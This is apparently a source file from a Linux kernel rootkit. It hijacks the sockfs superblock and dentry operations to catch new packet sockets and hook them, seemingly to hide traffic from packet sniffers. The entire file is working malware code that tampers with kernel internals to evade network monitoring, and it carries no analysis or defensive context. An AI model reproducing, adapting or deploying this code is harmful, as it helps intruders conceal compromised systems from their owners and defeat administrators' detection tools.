#include <linux/net.h>
#include <linux/netdevice.h>
#include <net/sock.h>
#include <linux/workqueue.h>
#include <linux/fs.h>
#include <linux/kfifo.h>

#include "headers/networking.h"

#include "socket/af_packet_internal.h"
#include "socket/packet_hook.h"
#include "socket/hook.h"

int hooked_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
    struct socket *sock = (struct socket *)wq_entry->private;
    
    if (is_packet_sock(sock)) {
        hook_packet_sock(sock);
    } else {
        list_del_init(&wq_entry->entry);
    }
    return 0;
}

#define FIFO_SIZE 8

static DECLARE_KFIFO(unhooked_sockets, struct socket *, FIFO_SIZE);
static DEFINE_SPINLOCK(read_lock);
static DEFINE_SPINLOCK(write_lock);

static const struct super_operations *original_s_op;
static const struct dentry_operations *original_s_d_op;

static int put_unhooked_socket(struct socket *sock) {
    int res;
    unsigned long flags;
    spin_lock_irqsave(&write_lock, flags);
    res = kfifo_put(&unhooked_sockets, sock);
    spin_unlock_irqrestore(&write_lock, flags);
    return res;
}

static int get_unhooked_socket(struct socket **sock) {
    int res;
    unsigned long flags;
    spin_lock_irqsave(&read_lock, flags);
    res = kfifo_get(&unhooked_sockets, sock);
    spin_unlock_irqrestore(&read_lock, flags);
    return res;
}

static int sock_is_ready(struct socket *sock) {
    // when we hook into packet sockets, we want these to be
    // initializated, otherwise our values might get overriden.
    return sock->ops && pkt_sk(sock->sk)->prot_hook.func;
}

static struct inode *hooked_alloc_inode(struct super_block *sb) {
    struct inode *res;
    struct socket *sock;
    struct wait_queue_entry *wq;

    // TODO: panic
    if (!original_s_op) return ERR_PTR(-ENOMEM);
    res = original_s_op->alloc_inode(sb);
    sock = SOCKET_I(res);

    /* Add wait queue entry */
    wq = kmalloc(sizeof(struct wait_queue_entry), GFP_KERNEL);
    init_waitqueue_func_entry(wq, &hooked_wake_up);
    wq->private = sock;
    add_wait_queue(&sock->wq.wait, wq);

    /* Add to unhooked queue */
    put_unhooked_socket(sock);
    return res;
}


static int hooked_d_init(struct dentry *dentry)
{
    int res;
    struct socket *sock;

    // The socket that caused this invocation of "d_init" should already be in the queue.
    int max_index = unhooked_sockets.kfifo.in;

    while (unhooked_sockets.kfifo.out < max_index) {
        res = get_unhooked_socket(&sock);
        if (!res) break;

        if (!is_packet_sock(sock)) continue;
        // If the socket is not "ready" it means it is not our socket, 
        // so we return it to the queue.
        if (!sock_is_ready(sock)) {
            put_unhooked_socket(sock);
        } else {
            hook_packet_sock(sock);
        }
    }	
	return 0;
}

int sniff_hiding_init(void) {
    struct file_system_type *fs_type;
    struct super_block *super;
    struct super_operations *s_op;
    struct dentry_operations *s_d_op;

    hook_init();
    INIT_KFIFO(unhooked_sockets);

    fs_type = get_fs_type("sockfs");

    // TODO: hook new super blocks when they are created.

    hlist_for_each_entry(super, &fs_type->fs_supers, s_instances) {
        if (!original_s_op) original_s_op = super->s_op;
        else if (original_s_op != super->s_op) return -1;

        if (!original_s_d_op) original_s_d_op = super->s_d_op;
        else if (original_s_d_op != super->s_d_op) return -1;

        s_op = kmalloc(sizeof(struct super_operations), GFP_KERNEL);
        memcpy(s_op, super->s_op, sizeof(struct super_operations));
        super->s_op = s_op;
        s_op->alloc_inode = &hooked_alloc_inode;

        s_d_op = kmalloc(sizeof(struct dentry_operations), GFP_KERNEL);
        memcpy(s_d_op, super->s_d_op, sizeof(struct dentry_operations));
        super->s_d_op = s_d_op;
        
        s_d_op->d_init = &hooked_d_init;
    }
    return 0;
}

void sniff_hiding_exit(void) {
    struct file_system_type *fs_type;
    struct super_block *super;
    struct super_operations *s_op;
    struct dentry_operations *s_d_op;
    
    
    fs_type = get_fs_type("sockfs");
    hlist_for_each_entry(super, &fs_type->fs_supers, s_instances) {
        // Since we currently don't hook into new supers.
        if (original_s_op == super->s_op) continue;
        if (original_s_d_op == super->s_d_op) continue;

        s_op = super->s_op;
        s_d_op = super->s_d_op;
        super->s_op = original_s_op;
        super->s_d_op = original_s_d_op;
        kfree(s_op);
        kfree(s_d_op);
    }
   
    kfifo_free(&unhooked_sockets);
    hook_exit();
}